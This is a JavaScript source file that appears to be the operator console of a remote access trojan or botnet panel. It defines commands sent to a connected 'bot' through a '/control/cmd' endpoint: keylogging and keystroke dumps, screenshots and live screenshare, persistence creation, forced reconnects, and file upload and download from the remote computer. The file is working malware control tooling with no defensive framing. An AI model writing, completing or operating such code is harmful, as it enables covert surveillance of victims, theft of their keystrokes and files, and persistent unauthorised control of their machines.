'use strict';

const commands = {
    reconnect: { id: 2, help: 'Force the remote computer to reconnect', usage: 'reconnect' },
    disconnect: { id: 7, help: 'Force the remote computer to disconnect', usage: 'disconnect' },

    screenshot: { id: 5, help: 'Capture a screenshot', usage: '\t\tscreenshot' },

    logger_start: { id: 12, help: 'Start keylogging', usage: '\t\t\tlogger_start' },
    logger_stop: { id: 13, help: 'Stop keylogging', usage: '\t\t\tlogger_stop' },
    logger_dump: { id: 14, help: 'Display keystrokes', usage: '\t\tlogger_dump' },

    chrome: { id: 6, help: 'Launch Chrome browser', usage: '\t\t\tchrome <tab1> <tab2> <tabn>' },

    persist_create: { id: 8, help: 'Create persistence', usage: '\t\t\tpersist_create' },
    persist_remove: { id: 9, help: 'Remove persistence', usage: '\t\t\tpersist_remove' },

    screen_start: {
        id: 15,
        help: 'Start screenshare',
        usage: '\t\t\tscreen_start <updateTime(sec)>'
    },
    screen_stop: { id: 16, help: 'Stop screenshare', usage: '\t\tscreen_stop' },
    screen_status: { id: 17, help: 'Status of screenshare', usage: '\t\t\tscreen_status' },

    ftp_status: { id: 1, help: 'Check the status of a file transfer', usage: 'ftp_status' },
    upload: { id: 3, help: 'Upload a file to the remote computer', usage: 'upload <file>' },
    download: { id: 4, help: 'Downaload a file from the remote computer', usage: 'download <file>' }
};

const CommandsEnum = { commands: 'commands', help: 'help' };

class Command extends Terminal {
    constructor() {
        Terminal.isSSH = false;
        super();
    }

    get mainMenu() {
        return (
            '<p>' +
            '<span>Type [command] + <kbd>Enter</kbd></span>' +
            '</p>' +
            '<ul style="list-style: none;">' +
            "<li>'help' -- display this list</li>" +
            "<li>'cls' -- clear screeen</li>" +
            "<li>'commands' -- display commands</li>" +
            '</ul>'
        );
    }

    get commands() {
        let displayed = false;
        let cmdOutput = '';
        let command;

        for (let cmd in commands) {
            if (!displayed) {
                displayed = true;
                cmdOutput += '\t# --------[ Available Commands ]-------- #\n\n';
            }

            command = commands[cmd];

            cmdOutput +=
                '\t' +
                cmd +
                '\t'.repeat(cmd.length < 8 ? 2 : 1) +
                command['help'] +
                '\t'.repeat(command['usage'].length < 15 ? 2 : 1) +
                command['usage'] +
                '\n';
        }

        cmdOutput +=
            '\n\tOverride a running process by using --override after the args\n' +
            '\tExample: download blueprint.pdf --override\n';

        return cmdOutput;
    }

    getArgs(cmd) {
        let args = [];

        for (let n = 1; n < cmd.length; n++) {
            args[n - 1] = cmd[n];
        }
        return args;
    }

    execute(cmd) {
        let _cmd = cmd.split(' ');

        let command = _cmd[0].toLowerCase();
        let args = _cmd.length > 1 ? this.getArgs(_cmd) : [-1];

        if (!(command in commands)) {
            if (command === CommandsEnum.commands) {
                this.stopExe(cmd, this.commands);
                return;
            } else if (command === CommandsEnum.help) {
                this.stopExe(cmd, '');
                $('#console-output').append(terminalObj.mainMenu);
                this.scroll();
                return;
            }

            this.stopExe(cmd, "'" + cmd.split(' ')[0] + "'" + ' is not recognized as a command');
            return;
        } else {
            this.startExe();
        }

        $.ajax({
            type: 'POST',
            url: '/control/cmd',
            data: { cmd_id: commands[command]['id'], args: args },
            beforeSend: request => {
                request.setRequestHeader('X-CSRFToken', $('#csrf_token').val());
            }
        })
            .done(resp => {
                let msg;

                if (resp['resp'].length !== 0) {
                    msg = resp['resp'];
                } else {
                    msg = 'Bot is not connected';
                }

                if (!Terminal.isSSH) {
                    this.stopExe(cmd, msg);
                } else {
                    this.stopExe('', '');
                }

                if (resp['resp'].length === 0) {
                    disableConsole();
                    updateStatus();
                }
            })
            .fail(() => {
                this.stopExe(cmd, 'Failed to contact server');
            });
    }
}
